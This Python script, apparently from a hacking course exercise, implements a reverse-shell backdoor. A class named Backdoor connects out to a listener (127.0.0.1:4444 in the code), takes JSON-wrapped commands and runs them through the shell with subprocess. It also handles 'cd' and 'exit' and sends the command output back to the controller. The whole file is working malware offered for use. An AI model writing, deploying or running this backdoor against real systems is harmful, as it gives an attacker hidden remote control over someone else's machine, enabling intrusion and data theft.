#!/usr/bin/env python
import socket
import subprocess
import json
import os


class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        #connection.send(b"\n[+] Connection initiated.\n")

    def reliable_send(self, data):
        json_data = json.dumps(data.decode())
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue


    def execute_system_command(self,command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return b"[+] Changing working directory to " + path.encode('utf-8') 
    
    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == 'exit':
                self.connection.close()
                exit()
            elif command[0] == 'cd' and len(command)>1:
                command_result = self.change_working_directory_to(command[1])
            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(command_result)
        
        self.connection.close()



my_backdoor = Backdoor("127.0.0.1", 4444)
my_backdoor.run()
